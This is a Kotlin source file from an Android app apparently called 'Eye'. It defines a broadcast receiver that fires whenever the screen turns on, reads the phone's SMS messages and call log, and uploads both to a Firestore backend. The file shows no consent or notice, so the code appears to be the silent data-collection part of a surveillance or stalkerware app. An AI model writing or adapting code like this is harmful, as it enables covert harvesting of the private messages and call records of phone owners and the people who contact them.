package com.eye.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.annotation.RequiresApi
import com.eye.EyeApp
import com.eye.data.repository.firestorerepository.FirestoreRepository
import com.eye.di.HiltEntryPoint
import com.eye.utils.EyeDetails.readCallLog
import com.eye.utils.EyeDetails.readSMS
import com.google.firebase.firestore.FirebaseFirestore
import dagger.Module
import dagger.assisted.Assisted
import dagger.hilt.EntryPoint
import dagger.hilt.InstallIn
import dagger.hilt.android.EntryPointAccessors
import dagger.hilt.android.internal.managers.ApplicationComponentManager
import dagger.hilt.components.SingletonComponent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch


class ScreenOnReceiver : BroadcastReceiver() {
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onReceive(context: Context?, intent: Intent?) {
        try {
            when (intent?.action){
                Intent.ACTION_SCREEN_ON -> {
                    println("hello")
                    val hiltEntryPoint =
                        EntryPointAccessors.fromApplication(context!!, HiltEntryPoint::class.java)
                    val firestoreRepository = hiltEntryPoint.firestoreRepository()
                    CoroutineScope(SupervisorJob()).launch {
                        val smsReader = context?.readSMS()?.groupBy {
                            it.date
                        }
                        if (smsReader != null) {
                            firestoreRepository.uploadSMSLog(smsReader)
                        }

                        val callLogs = context?.readCallLog()?.groupBy {
                            it.date
                        }

                        if (callLogs != null){
                            firestoreRepository.uploadCallLog(callLogs)
                        }
                    }
                }
                Intent.ACTION_SCREEN_OFF -> {
                    println("bye")
                    val appContext = context?.applicationContext as? EyeApp
                    appContext?.unregisterScreenStateReceiver()
                }
            }
        }catch (e:Exception){
            e.printStackTrace()
        }

    }
}